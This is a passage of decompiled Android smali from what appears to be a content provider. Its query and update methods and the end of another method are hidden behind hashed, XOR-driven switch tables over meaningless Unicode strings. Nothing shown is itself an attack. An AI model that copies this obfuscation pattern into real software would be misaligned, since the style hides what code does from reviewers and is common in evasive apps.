    const-string v1, "\u06e8\u06e2\u06e8\u06d8\u06d7\u06eb\u06dc\u06eb\u06d9\u06d6\u06e2\u06eb\u06dc\u06e2\u06e2\u06e0\u06e5\u06e0\u06e1\u06ec\u06d7\u06e2\u06d8\u06d6\u06ec\u06e6\u06d9\u06d6\u06d8\u06e7\u06d8\u06e6\u06d8\u06eb\u06e6\u06e1\u06e0\u06db\u06e4\u06da\u06dc\u06ec\u06d9\u06ec\u06eb\u06e7\u06d9\u06e7\u06eb\u06e5\u06e5\u06d9\u06e4\u06dc\u06d8\u06e4\u06e4\u06da"
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_11

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :sswitch_36
    :try_start_3
    const-string v1, "\u06d9\u06e6\u06dc\u06d8\u06ec\u06e6\u06e2\u06d6\u06e0\u06e7\u06e4\u06da\u06e0\u06e2\u06da\u06d8\u06e2\u06e6\u06d8\u06d8\u06e5\u06ec\u06d9\u06e5\u06e8\u06dc\u06d8\u06d9\u06dc\u06e7\u06d8\u06db\u06d7\u06e8\u06d8\u06df\u06d6\u06ec\u06d8\u06d7\u06d8\u06d8\u06e7\u06ec\u06e6\u06e5\u06ec\u06d9\u06d7\u06e0\u06d7\u06d9\u06d9\u06d6\u06d8"

    goto :goto_10

    :cond_7
    const-string v1, "\u06e0\u06d9\u06e7\u06d6\u06d6\u06e6\u06d8\u06d7\u06d7\u06e1\u06e2\u06df\u06d6\u06d8\u06e4\u06ec\u06e1\u06d8\u06e6\u06e5\u06e1\u06d8\u06d6\u06e0\u06d8\u06d8\u06e5\u06e8\u06e4\u06eb\u06ec\u06d6\u06d8\u06e2\u06db\u06d6\u06e2\u06da\u06e7\u06ec\u06d8\u06e2\u06e2\u06d6\u06df\u06e1\u06e7\u06e6\u06d8\u06e1\u06e5\u06e4\u06df\u06e0\u06dc\u06e1\u06e5\u06d8\u06d9\u06e0\u06e5\u06d8"

    goto :goto_11

    :sswitch_37
    const-string v1, "\u06e6\u06e1\u06e4\u06dc\u06d7\u06e2\u06da\u06e2\u06df\u06df\u06e0\u06e6\u06e5\u06e5\u06d8\u06df\u06db\u06e8\u06d8\u06db\u06df\u06e2\u06df\u06eb\u06d6\u06d8\u06e4\u06e1\u06e1\u06e7\u06ec\u06e1\u06d8\u06eb\u06e4\u06d6\u06e8\u06e0\u06e8\u06e2\u06d8\u06ec\u06d8\u06dc\u06e7\u06d7\u06d6\u06e8\u06d8\u06d7\u06e7\u06e1\u06d8"

    goto :goto_11

    :sswitch_38
    const-string v1, "\u06e4\u06dc\u06e5\u06eb\u06d6\u06dc\u06d8\u06eb\u06da\u06d7\u06e4\u06eb\u06d9\u06df\u06e1\u06df\u06e5\u06e7\u06ec\u06db\u06d9\u06e8\u06d8\u06e0\u06d9\u06db\u06e4\u06e7\u06d8\u06df\u06e8\u06df\u06d8\u06e5\u06ec\u06e7\u06e6\u06e7\u06d8\u06dc\u06e2\u06d7\u06e5\u06da\u06dc\u06df\u06da\u06e8\u06d8\u06d6\u06d8\u06eb\u06d8\u06e1\u06e5\u06e5\u06db"
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_10

    :sswitch_39
    const-string v1, "\u06d6\u06db\u06e2\u06e4\u06da\u06d7\u06dc\u06d9\u06eb\u06db\u06df\u06e6\u06e8\u06e1\u06ec\u06e0\u06e5\u06d7\u06e0\u06d6\u06e1\u06d8\u06d9\u06e0\u06e8\u06d6\u06dc\u06e8\u06dc\u06e8\u06db\u06db\u06d9\u06e0\u06ec\u06db\u06e5\u06e6\u06e5\u06d7\u06d7\u06d7\u06e5"

    goto :goto_10

    :sswitch_3a
    invoke-static {v0}, Lapi/repository/Utils;->checkNetworkAndExitIfUnavailable(Landroid/content/Context;)V

    :sswitch_3b
    invoke-static {v0}, Lapi/repository/ActivityKeeper;->init(Landroid/app/Application;)V

    move v0, v3

    goto/16 :goto_2

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :sswitch_data_0
    .sparse-switch
        -0x70b922d9 -> :sswitch_0
        -0x602cadd9 -> :sswitch_7
        0x4eb6538d -> :sswitch_6
        0x5663c343 -> :sswitch_5
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        0x1d7410e1 -> :sswitch_4
        0x4eccaec1 -> :sswitch_1
        0x54968730 -> :sswitch_3
        0x577cdf63 -> :sswitch_2
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x75804abe -> :sswitch_10
        -0x2c44c6a0 -> :sswitch_b
        0x221ef455 -> :sswitch_8
        0x5c9de6bc -> :sswitch_f
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x328a6511 -> :sswitch_19
        0xae5011e -> :sswitch_33
        0x1faaf684 -> :sswitch_1d
        0x68b61005 -> :sswitch_9
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x7dac38b0 -> :sswitch_d
        -0x77e497e0 -> :sswitch_e
        -0x76698128 -> :sswitch_c
        0x49a60c70 -> :sswitch_a
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x4bcbb7bb -> :sswitch_11
        -0x311ad5ca -> :sswitch_17
        -0x1d9e3e93 -> :sswitch_8
        -0x1b41d5a1 -> :sswitch_16
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x70ab3abd -> :sswitch_14
        -0xe75c28f -> :sswitch_13
        0x1cea12bc -> :sswitch_12
        0x72fb727f -> :sswitch_15
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        -0x7ed81de1 -> :sswitch_1c
        -0x4ab7bf5d -> :sswitch_1b
        0x28125bf1 -> :sswitch_1a
        0x5345d14f -> :sswitch_18
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x46d46a2b -> :sswitch_21
        -0x3d843278 -> :sswitch_33
        0x581e25a2 -> :sswitch_1e
        0x77d896e9 -> :sswitch_25
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x71e1dec8 -> :sswitch_27
        -0x4004c6d8 -> :sswitch_2b
        0x16aa23b -> :sswitch_33
        0x4a172e46 -> :sswitch_1f
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0x1bb33cf4 -> :sswitch_22
        0x4549b36c -> :sswitch_20
        0x51ac8099 -> :sswitch_23
        0x7467eb7e -> :sswitch_24
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        -0x56505c3f -> :sswitch_28
        -0x11f2c9e -> :sswitch_29
        0x314771da -> :sswitch_26
        0x575aaeef -> :sswitch_2a
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x40ada1a8 -> :sswitch_32
        0x7793019 -> :sswitch_31
        0xf45a15e -> :sswitch_33
        0x6d959985 -> :sswitch_2c
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        -0x5d813853 -> :sswitch_30
        -0x15a234a5 -> :sswitch_2f
        -0xe67d59b -> :sswitch_2e
        0x151841e1 -> :sswitch_2d
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x5e338268 -> :sswitch_34
        -0x1068105d -> :sswitch_3b
        0x35de008 -> :sswitch_39
        0x5a1eedac -> :sswitch_3a
    .end sparse-switch

    :sswitch_data_f
    .sparse-switch
        -0x5edc1d60 -> :sswitch_37
        -0x569297b4 -> :sswitch_38
        -0x50964f8f -> :sswitch_35
        0x2c1636a1 -> :sswitch_36
    .end sparse-switch
.end method

.method public final query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 4

    const-string v0, "\u06d8\u06e5\u06e8\u06d8\u06e5\u06dc\u06d6\u06ec\u06d8\u06e4\u06d8\u06e0\u06e1\u06d9\u06da\u06d6\u06d8\u06e4\u06eb\u06e2\u06eb\u06df\u06e6\u06db\u06e5\u06eb\u06e4\u06d7\u06db\u06e1\u06e8\u06dc\u06d8\u06dc\u06dc\u06df\u06eb\u06d7\u06e2\u06db\u06da\u06e2\u06e8\u06e0\u06d9"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x139

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x381

    const/16 v2, 0xc7

    const v3, 0x6c39fdcf

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06dc\u06d9\u06e8\u06e2\u06d6\u06df\u06e8\u06d6\u06e0\u06e8\u06d6\u06ec\u06e2\u06e0\u06db\u06e1\u06e0\u06d8\u06e2\u06e6\u06dc\u06d8\u06e8\u06d8\u06d8\u06e4\u06da\u06df\u06e8\u06df\u06d6\u06d8\u06e8\u06e8\u06ec\u06eb\u06d6\u06e0\u06dc\u06eb\u06d9\u06df\u06e1\u06df\u06db\u06d6\u06d8\u06d7\u06e1\u06dc\u06d8\u06df\u06e8\u06e4\u06e5\u06e8\u06e1"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06e8\u06db\u06d6\u06d8\u06e5\u06e8\u06db\u06db\u06e0\u06e6\u06da\u06d7\u06e5\u06d8\u06eb\u06df\u06e6\u06d8\u06e0\u06dc\u06d8\u06e6\u06e0\u06e5\u06eb\u06e1\u06da\u06e1\u06e1\u06d6\u06eb\u06e1\u06d8\u06d8"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06e8\u06e6\u06d9\u06e4\u06d6\u06db\u06d6\u06d8\u06e8\u06d8\u06ec\u06e2\u06dc\u06d8\u06dc\u06da\u06e2\u06e6\u06e4\u06e6\u06d8\u06d6\u06d9\u06d6\u06d6\u06db\u06e6\u06e1\u06eb\u06d6\u06d6\u06da\u06dc\u06d8"

    goto :goto_0

    :sswitch_3
    const-string v0, "\u06e0\u06d6\u06e6\u06d6\u06eb\u06d6\u06e2\u06d8\u06e1\u06d8\u06dc\u06d9\u06e8\u06d8\u06e4\u06d8\u06e0\u06e0\u06e1\u06e6\u06e1\u06e4\u06d7\u06eb\u06d9\u06e6\u06e6\u06e0\u06df\u06e0\u06dc\u06d8\u06d8\u06e4\u06e1\u06d7\u06d7\u06e1\u06ec\u06d8\u06e0\u06e4\u06dc\u06e7\u06e8\u06e4\u06e8\u06d8\u06d8\u06d8\u06d6\u06d6\u06e7\u06e2\u06d9\u06e2\u06df"

    goto :goto_0

    :sswitch_4
    const-string v0, "\u06e6\u06df\u06e1\u06e7\u06dc\u06eb\u06da\u06e8\u06e4\u06e8\u06e5\u06db\u06df\u06e7\u06e8\u06ec\u06d9\u06e8\u06d8\u06d6\u06e7\u06e0\u06e2\u06e8\u06d9\u06e8\u06d8\u06e5\u06e2\u06e1\u06d7\u06e0\u06e8\u06e2\u06dc\u06df\u06d6\u06e8\u06d9\u06db\u06d6\u06d6\u06e2\u06dc\u06e4\u06d7\u06df"

    goto :goto_0

    :sswitch_5
    const-string v0, "\u06ec\u06dc\u06dc\u06d8\u06d7\u06e1\u06d6\u06d8\u06d9\u06da\u06e4\u06db\u06e7\u06e0\u06e6\u06d8\u06df\u06ec\u06e0\u06db\u06e5\u06df\u06e7\u06dc\u06d6\u06e5\u06d7\u06eb\u06e7\u06d8\u06eb\u06eb\u06e6\u06e1\u06eb\u06dc\u06d6\u06e7\u06e7\u06db\u06d8\u06d8\u06e8\u06ec\u06e1\u06d8\u06e0\u06e7\u06eb\u06d7\u06df\u06e6\u06e2\u06d6\u06e5\u06e5\u06e0"

    goto :goto_0

    :sswitch_6
    const/4 v0, 0x0

    return-object v0

    :sswitch_data_0
    .sparse-switch
        -0x71d44068 -> :sswitch_1
        -0x692bb974 -> :sswitch_3
        -0x472cbbb4 -> :sswitch_0
        -0x2efc8001 -> :sswitch_5
        0x1a7ec7f9 -> :sswitch_4
        0x3eda3e30 -> :sswitch_6
        0x4f1d565b -> :sswitch_2
    .end sparse-switch
.end method

.method public final update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 4

    const-string v0, "\u06e2\u06e5\u06e2\u06e4\u06e8\u06dc\u06d8\u06d7\u06e5\u06e5\u06d8\u06d7\u06e5\u06d8\u06d8\u06e1\u06e7\u06df\u06dc\u06e7\u06d9\u06d9\u06e6\u06db\u06d8\u06e2\u06dc\u06d8\u06e8\u06eb\u06e5\u06e8\u06d6\u06db\u06df\u06db\u06e1\u06d8\u06e7\u06eb\u06e5\u06d8\u06d8\u06d6\u06e7\u06d8\u06e1\u06e4\u06df\u06e6\u06e2\u06e5\u06e4\u06e8\u06d6\u06d8\u06e2\u06e8\u06e5\u06d9\u06e1\u06d8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x283

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x85

    const/16 v2, 0x233

    const v3, 0x763f7fcb

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06d9\u06eb\u06e5\u06d8\u06e5\u06e5\u06d8\u06d8\u06dc\u06eb\u06e5\u06e5\u06ec\u06eb\u06e4\u06db\u06da\u06e4\u06db\u06ec\u06e1\u06d8\u06e1\u06d8\u06e7\u06ec\u06e5\u06d8\u06eb\u06d7\u06e1\u06e1\u06e5\u06e8\u06d8\u06e2\u06df\u06e8\u06d8\u06e7\u06d6\u06eb"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06e1\u06e0\u06e7\u06e7\u06d9\u06e4\u06df\u06e8\u06e5\u06e1\u06e5\u06d8\u06d8\u06e5\u06e6\u06ec\u06dc\u06df\u06e6\u06df\u06d7\u06e2\u06e7\u06da\u06d6\u06d8\u06e2\u06d9\u06d6\u06d8\u06d9\u06d8\u06e4\u06df\u06e6\u06e7\u06e1\u06d8\u06e1\u06d8\u06e2\u06db\u06e4\u06e4\u06e2\u06e6\u06d8\u06db\u06e1\u06db\u06ec\u06e4\u06e0"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06e7\u06e1\u06d6\u06dc\u06dc\u06e0\u06dc\u06e0\u06d8\u06e2\u06d7\u06da\u06e4\u06e8\u06dc\u06dc\u06d9\u06df\u06e0\u06d6\u06e1\u06e0\u06e2\u06e2\u06d7\u06db\u06e8\u06eb\u06d8\u06e5\u06d8\u06e8\u06df\u06e2\u06e6\u06e6\u06d8\u06eb\u06e5\u06e2\u06d8"

    goto :goto_0

    :sswitch_3
    const-string v0, "\u06e6\u06eb\u06eb\u06eb\u06eb\u06d8\u06d8\u06e4\u06e4\u06e1\u06d8\u06d6\u06e4\u06d8\u06e8\u06e2\u06df\u06e1\u06e8\u06d6\u06df\u06d9\u06e8\u06eb\u06da\u06e1\u06d7\u06e6\u06d7\u06e4\u06d6\u06e5\u06d8\u06d6\u06d7\u06e5\u06df\u06e5\u06df\u06db\u06d7\u06df\u06d9\u06e2\u06db\u06e1\u06e1\u06d8\u06e2\u06e7\u06e6"

    goto :goto_0

    :sswitch_4
    const-string v0, "\u06d8\u06d8\u06e8\u06d8\u06e2\u06d8\u06ec\u06df\u06e2\u06d8\u06d6\u06e8\u06d6\u06d9\u06eb\u06e5\u06e0\u06d8\u06e5\u06eb\u06e2\u06d7\u06e0\u06e7\u06e5\u06d8\u06d8\u06d7\u06d8\u06da\u06d9\u06dc\u06d8\u06e0\u06e7\u06d8\u06d8\u06e6\u06e8\u06d9"

    goto :goto_0

    :sswitch_5
    const/4 v0, 0x0

    return v0

    nop

    :sswitch_data_0
    .sparse-switch
        -0x64c8b17f -> :sswitch_4
        -0x2645ee4d -> :sswitch_3
        -0x1c26869b -> :sswitch_2
        0x261fdcaf -> :sswitch_1
        0x30691d19 -> :sswitch_5
        0x5f8cb467 -> :sswitch_0
    .end sparse-switch
.end method
